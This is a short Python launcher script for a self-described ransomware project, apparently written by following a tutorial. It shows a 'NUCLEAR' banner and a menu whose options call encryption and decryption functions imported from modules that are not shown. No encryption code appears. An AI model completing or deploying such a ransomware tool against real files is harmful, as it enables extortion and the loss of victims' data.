### Ransomware written in Python
# Date : 01-24-23
# Auth : Jy4n

# Yes, I followed NetworkChucks's Tutorial

import os
from Lib.ransomware import *
from Lib.decryptor import *

def banner():
	print("+-----------------+")
	print("|---- NUCLEAR ----|")
	print("|  -- By Jy4n --  |")
	print("+-----------------+")

def clear_screen():
	os.system("clear")

is_quit = False

def main():
	clear_screen()
	banner()
	print("Select Options:")
	print(" [1] : Encrypt \n [2] : Decrypt \n [3] : Exit")
	query = int(input("Enter the number of your choice: "))	
	
	if query == 1:
		clear_screen()
		banner()
		encrypt_files()
	elif query == 2:
		clear_screen()
		banner()
		decrypt_files()
	elif query == 3:
		clear_screen()
		banner()
		print("Exit...")
		is_quit = True
	else:
		print("Please enter a correct number")

main()
